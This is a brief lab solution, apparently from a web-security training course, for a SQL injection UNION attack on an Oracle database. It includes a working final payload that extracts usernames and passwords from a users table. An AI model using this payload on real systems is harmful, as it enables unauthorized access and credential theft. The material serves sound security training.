# Lab 6: SQL Injection UNION Attack, Listing the Database Contents on Oracle Databases

* **Solution**: Confirm 2 columns, test string compatibility, then extract usernames and passwords from users using Oracle’s || concatenation.
* **Final Payload**: category=Gifts' UNION SELECT NULL, username || '.' || password FROM users --